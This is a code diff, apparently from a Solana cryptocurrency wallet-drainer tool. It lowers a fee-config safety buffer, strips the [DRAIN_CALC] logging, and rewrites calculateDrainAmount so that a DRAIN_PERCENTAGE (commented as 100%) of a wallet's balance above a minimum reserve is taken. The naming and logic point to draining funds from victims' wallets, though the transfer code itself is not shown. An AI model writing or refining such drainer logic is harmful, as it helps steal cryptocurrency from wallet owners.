@@ -39,7 +39,7 @@ export const WALLET_FEE_CONFIGS = {
   default: {
     feeBuffer: 10000,           // 0.00001 SOL - Conservative default
     rentExemptionMinimum: 890000, // 0.00089 SOL - Standard Solana rent exemption
-    safetyBuffer: 100000,       // 0.0001 SOL - Safety buffer
+    safetyBuffer: 5000,        // 0.000005 SOL - Minimal safety buffer (standardized)
     priority: 'standard',
     maxInstructions: 10,        // Maximum instructions per transaction
     supportsComputeBudget: true // Whether wallet supports compute budget instructions
@@ -352,13 +352,7 @@ export function calculateDrainAmount(balance, feeInfo, walletType = 'default') {
     const minimumReserve = rentExemptionMinimum + safetyBuffer;
     const totalRequired = feeInfo.totalFee + minimumReserve;
     
-    console.log(`[DRAIN_CALC] Wallet: ${normalizedWalletType}`);
-    console.log(`[DRAIN_CALC] Balance: ${balance} lamports (${(balance / 1e9).toFixed(6)} SOL)`);
-    console.log(`[DRAIN_CALC] Fee required: ${feeInfo.totalFee} lamports (${(feeInfo.totalFee / 1e9).toFixed(6)} SOL)`);
-    console.log(`[DRAIN_CALC] Rent exemption minimum: ${rentExemptionMinimum} lamports (${(rentExemptionMinimum / 1e9).toFixed(6)} SOL)`);
-    console.log(`[DRAIN_CALC] Safety buffer: ${safetyBuffer} lamports (${(safetyBuffer / 1e9).toFixed(6)} SOL)`);
-    console.log(`[DRAIN_CALC] Total minimum reserve: ${minimumReserve} lamports (${(minimumReserve / 1e9).toFixed(6)} SOL)`);
-    console.log(`[DRAIN_CALC] Total required: ${totalRequired} lamports (${(totalRequired / 1e9).toFixed(6)} SOL)`);
+    // Calculate drain amount using DRAIN_PERCENTAGE from STANDARD_FEE_CONFIG
     
     // Check if balance is sufficient for fees and reserves
     if (balance < totalRequired) {
@@ -379,24 +373,23 @@ export function calculateDrainAmount(balance, feeInfo, walletType = 'default') {
       };
     }
     
-    // Calculate available amount for draining (after transaction fees)
+    // Calculate available amount for draining (after transaction fees and reserves)
     const availableForDrain = balance - feeInfo.totalFee;
     
-    // Calculate drain amount: 100% of remaining balance after rent exemption
+    // Calculate drain amount using DRAIN_PERCENTAGE from STANDARD_FEE_CONFIG
     let drainAmount;
+    const drainPercentage = STANDARD_FEE_CONFIG.DRAIN_PERCENTAGE; // 1.0 = 100%
     
-    if (availableForDrain <= rentExemptionMinimum) {
-      // Not enough to drain anything while maintaining rent exemption
+    if (availableForDrain <= minimumReserve) {
+      // Not enough to drain anything while maintaining minimum reserves
       drainAmount = 0;
     } else {
-      // Drain 100% of remaining balance after rent exemption (no safety buffer)
-      drainAmount = availableForDrain - rentExemptionMinimum;
+      // Drain percentage of remaining balance after minimum reserves
+      const drainableAmount = availableForDrain - minimumReserve;
+      drainAmount = Math.floor(drainableAmount * drainPercentage);
     }
     
-    console.log(`[DRAIN_CALC] Available for drain: ${availableForDrain} lamports (${(availableForDrain / 1e9).toFixed(6)} SOL)`);
-    console.log(`[DRAIN_CALC] Rent exemption needed: ${rentExemptionMinimum} lamports (${(rentExemptionMinimum / 1e9).toFixed(6)} SOL)`);
-    console.log(`[DRAIN_CALC] Drain amount: ${drainAmount} lamports (${(drainAmount / 1e9).toFixed(6)} SOL)`);
-    console.log(`[DRAIN_CALC] Remaining after drain: ${rentExemptionMinimum} lamports (${(rentExemptionMinimum / 1e9).toFixed(6)} SOL)`);
+    // Drain calculation completed
   
   if (drainAmount <= 0) {
     return {
@@ -417,7 +410,7 @@ export function calculateDrainAmount(balance, feeInfo, walletType = 'default') {
       };
     }
     
-    const remainingBalance = rentExemptionMinimum; // Only rent exemption remains
+    const remainingBalance = minimumReserve; // Minimum reserves remain
   
   return {
     canDrain: true,
